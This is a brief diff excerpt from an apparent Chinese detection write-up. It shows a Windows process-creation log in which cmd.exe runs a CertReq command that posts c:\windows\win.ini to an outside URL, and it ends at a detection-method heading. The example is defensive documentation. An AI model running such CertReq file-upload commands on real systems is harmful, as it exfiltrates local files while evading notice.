@@ -105,7 +105,7 @@ Vary: Accept-Encoding,User-Agent
 强制性标签: Mandatory Label\Medium Mandatory Level
 创建者进程 ID: 0x24b4
 创建者进程名称: C:\Windows\System32\cmd.exe
-进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
+进程命令行: CertReq  -Post -config https://www.baidu.com/ c:\windows\win.ini output.txt
 ```
 
 ## 检测方法/思路
